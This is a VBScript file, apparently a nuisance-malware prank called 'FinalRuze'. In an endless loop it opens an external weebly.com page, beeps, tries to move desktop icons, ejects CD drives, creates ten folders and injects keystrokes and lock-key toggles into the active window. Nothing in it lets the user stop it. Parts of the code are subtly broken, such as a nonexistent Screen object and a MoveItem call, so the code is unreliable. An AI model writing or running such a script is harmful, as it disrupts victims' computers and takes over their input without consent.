Option Explicit

Dim objShell, objShellApp, objDesktop, objFolder, objItem, xPos, yPos, ts, strDriveLetter, intDriveLetter, fs, colCDROMs, d, oWMP, i, folder_name
Const CDROM = 4
Const num_folders = 10
Dim base_folder_name

' Main loop
Do While True

    ' Open website loop
    For i = 1 To 2
        CreateObject("WScript.Shell").Run "https://j26nabr4tcsw908qiu.weebly.com/", 1, False
    Next

    ' Beep sound loop
    For i = 1 To 5
        CreateObject("WScript.Shell").Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True
    Next

    ' Move desktop items loop
    Set objShell = WScript.CreateObject("WScript.Shell")
    Set objShellApp = CreateObject("Shell.Application")
    Set objDesktop = objShellApp.Namespace(0)
    Set objFolder = objDesktop.Self
    For i = 1 To 5
        For Each objItem In objFolder.Items
            Randomize
            xPos = Int((Screen.Width - objItem.Width) * Rnd)
            yPos = Int((Screen.Height - objItem.Height) * Rnd)
            objShellApp.MoveItem objItem, xPos, yPos
        Next
        WScript.Sleep 5000
    Next

    ' Eject CD loop
    Set fs = CreateObject("Scripting.FileSystemObject")
    strDriveLetter = ""
    For intDriveLetter = Asc("A") To Asc("Z")
        Err.Clear
        If fs.GetDrive(Chr(intDriveLetter)).DriveType = CDROM Then
            If Err.Number = 0 Then
                strDriveLetter = Chr(intDriveLetter)
                Exit For
            End If
        End If
    Next
    Set oWMP = CreateObject("WMPlayer.OCX.7" )
    Set colCDROMs = oWMP.cdromCollection
    For d = 0 to colCDROMs.Count - 1
        colCDROMs.Item(d).Eject
    Next
    For d = 0 to colCDROMs.Count - 1
        colCDROMs.Item(d).Eject
    Next
    set owmp = nothing
    set colCDROMs = nothing

    ' Create many folders
    base_folder_name = "FinalRuze"
    For i = 1 To num_folders
        folder_name = base_folder_name & i
        CreateObject("Scripting.FileSystemObject").CreateFolder folder_name
        WScript.Echo "Created folder: " & folder_name
    Next

    ' Type some text and toggle lock keys
    set objShell = wscript.createobject ("wscript.shell")
    For i = 1 To 5
        wscript.sleep 100
        objShell.sendkeys "{CAPSLOCK}"
        objShell.sendkeys "{NUMLOCK}"
        objShell.sendkeys "This is the FinalRuze"
        objShell.sendkeys "{SCROLLLOCK}"
    Next

Loop
